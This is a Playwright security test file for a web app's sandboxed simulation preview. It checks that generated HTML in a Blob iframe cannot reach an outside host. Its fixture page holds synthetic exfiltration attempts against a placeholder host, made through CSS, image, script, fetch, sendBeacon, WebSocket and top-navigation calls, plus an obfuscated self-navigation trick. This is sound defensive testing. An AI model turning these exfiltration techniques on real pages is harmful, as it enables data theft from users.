import { test, expect } from "@playwright/test";

test("the executing Blob blocks resource exfiltration and keeps inline simulations working", async ({ page }) => {
  const outbound: string[] = [];
  await page.route("https://resource.invalid/**", async (route) => { outbound.push(route.request().url()); await route.abort(); });
  await page.goto("./login");
  await page.evaluate(async () => {
    const path = "/Causalyst/src/lib/api.ts";
    const { createSimulationPreviewObjectUrl } = await import(path);
    const html = `<!doctype html><html><head><style>body{background:url(https://resource.invalid/css)}</style></head><body>
      <img src=https://resource.invalid/unquoted><svg><image href="https://resource.invalid/svg"></image></svg>
      <script src="https://resource.invalid/script"></script>
      <button onclick="this.textContent='Advanced'">Advance</button>
      <script>
        window.violations=[]; document.addEventListener('securitypolicyviolation',e=>window.violations.push(e.violatedDirective));
        fetch('https://resource.invalid/fetch').catch(()=>{});
        try {navigator.sendBeacon('https://resource.invalid/beacon','synthetic');} catch {}
        try {new WebSocket('wss://resource.invalid/socket');} catch {}
        try {window.top.location='https://resource.invalid/top';} catch {}
      </script></body></html>`;
    const frame = document.createElement("iframe"); frame.id = "preview"; frame.sandbox.add("allow-scripts");
    frame.src = await createSimulationPreviewObjectUrl(new Blob([html], { type: "text/html" }));
    document.body.append(frame);
  });
  const frame = page.frameLocator("#preview");
  await frame.getByRole("button", { name: "Advance", exact: true }).click();
  await expect(frame.getByRole("button", { name: "Advanced", exact: true })).toBeVisible();
  const child = page.frames().find((frame) => frame.url().startsWith("blob:"))!;
  await expect.poll(() => child.evaluate(() => (window as any).violations.length)).toBeGreaterThan(0);
  expect(outbound).toEqual([]);
  expect(page.url()).toContain("/Causalyst/login");
});

test("documents that sandboxed generated JavaScript can still navigate its own frame", async ({ page }) => {
  let navigated = false;
  await page.route("https://resource.invalid/self", async (route) => { navigated = true; await route.fulfill({ body: "Isolated navigation fixture" }); });
  await page.goto("./login");
  await page.evaluate(async () => {
    const path = "/Causalyst/src/lib/previewPolicy.ts";
    const { protectPreviewDocument } = await import(path);
    const frame = document.createElement("iframe"); frame.sandbox.add("allow-scripts");
    frame.src = URL.createObjectURL(new Blob([protectPreviewDocument('<!doctype html><html><body><script>setTimeout(()=>{window["loc"+"ation"]="https://resource.invalid/self"},20)</script></body></html>')], { type: "text/html" }));
    document.body.append(frame);
  });
  await expect.poll(() => navigated).toBe(true);
  expect(page.url()).toContain("/Causalyst/login");
});
